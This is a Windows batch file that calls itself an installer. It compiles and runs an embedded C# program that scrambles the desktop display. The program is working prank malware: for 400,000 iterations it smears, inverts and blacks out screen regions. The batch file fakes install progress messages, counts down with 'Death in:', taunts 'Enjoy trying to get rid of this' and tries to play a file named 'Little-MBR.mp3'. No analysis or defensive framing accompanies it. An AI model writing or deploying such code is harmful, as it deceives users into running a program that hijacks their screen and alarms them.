@echo off
title Installer
setlocal enabledelayedexpansion

set CS_FILE=%TEMP%\gdi_payload.cs
set EXE_FILE=%TEMP%\gdi_effect.exe

echo [+] Grabbing files...

:: Clean up old failed compilations if they exist
if exist "%CS_FILE%" del /q "%CS_FILE%"
if exist "%EXE_FILE%" del /q "%EXE_FILE%"

:: Safely extract the raw code text below using proper parenthetical blocks
set write=0
for /f "usebackq delims=" %%A in ("%~f0") do (
    if "%%A"=="===BEGIN_CS_CODE===" set write=1
    if !write!==1 (
        if "%%A" NEQ "===BEGIN_CS_CODE===" (
            echo %%A >> "%CS_FILE%"
        )
    )
)

echo [+] Locating built-in Windows .NET compiler...
set CSC_PATH=
for /d %%D in (%SystemRoot%\Microsoft.NET\Framework\v4.0.*) do (
    if exist "%%D\csc.exe" set "CSC_PATH=%%D\csc.exe"
)

if not defined CSC_PATH (
    echo [!] Error: Could not find csc.exe.
    pause
    exit /b
)

echo [+] Installing files...
"%CSC_PATH%" /target:winexe /out:"%EXE_FILE%" "%CS_FILE%"

if %ERRORLEVEL% NEQ 0 (
    echo [!] Compilation failed. Check your syntax overrides.
    pause
    exit /b
)

echo [+] Success! Enjoy trying to get rid of this ;)
del "%CS_FILE%"

echo [+] Starting...
echo [+] Mem-O-Run has been activated.
echo [+] Death in:
for /l %%I in (15,-1,1) do (
    timeout /t 1 /nobreak > nul
    <nul set /p "=%%I... "
)
echo.

timeout /t 1 /nobreak > nul

start "" "%EXE_FILE%"

start /min C:\Mem-O-Run-v1.0.1\Little-MBR.mp3

echo [+] Done.
pause
goto :EOF

===BEGIN_CS_CODE===
using System;
using System.Runtime.InteropServices;
using System.Threading;

class GDIEffect {
    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

    private const uint SRCCOPY = 0x00CC0020;
    private const uint SRCINVERT = 0x00660046;
    private const uint BLACKNESS = 0x00000042;
    private const uint WHITENESS = 0x00FF0062;

    static void Main() {
        IntPtr hwnd = GetDesktopWindow();
        IntPtr hdc = GetWindowDC(hwnd);
        int w = GetSystemMetrics(0); // 0 = Screen Width
        int h = GetSystemMetrics(1); // 1 = Screen Height (Fixed from 0 to 1)
        Random r = new Random();

        for (int i = 0; i < 400000; i++) {
            // 1. Execute your vertical screen-melting pixel pull
            int x = r.Next(0, w); // Fixed: Added missing '0' inside r.Next
            int y = r.Next(0, h);
            BitBlt(hdc, x + r.Next(-15, 15), y + r.Next(-15, 15), w, h, hdc, x, y, SRCCOPY);

            if (i % 5 == 0) {
                int effectChoice = r.Next(0, 4);
                switch (effectChoice) {
                    case 0:
                        // Heavy block shift (scatter chunks of screen)
                        int x1 = r.Next(0, w);
                        int y1 = r.Next(0, h);
                        int x2 = r.Next(0, w);
                        int y2 = r.Next(0, h);
                        BitBlt(hdc, x1, y1, r.Next(50, 400), r.Next(50, 400), hdc, x2, y2, SRCCOPY);
                        break;

                    case 1:
                        // Color inversion block punch
                        int invX = r.Next(0, w);
                        int invY = r.Next(0, h);
                        BitBlt(hdc, invX, invY, r.Next(100, 500), r.Next(100, 500), hdc, invX, invY, SRCINVERT);
                        break;

                    case 2:
                        // Solid black artifact generation
                        PatBlt(hdc, r.Next(0, w), r.Next(0, h), r.Next(30, 300), r.Next(30, 300), BLACKNESS);
                        break;

                    case 3:
                        // Solid white artifact generation
                        PatBlt(hdc, r.Next(0, w), r.Next(0, h), r.Next(30, 300), r.Next(30, 300), WHITENESS);
                        break;
                }
            }

            Thread.Sleep(1);
        }

        // Clean up handles upon completion to free system resources
        ReleaseDC(hwnd, hdc);
    }
}
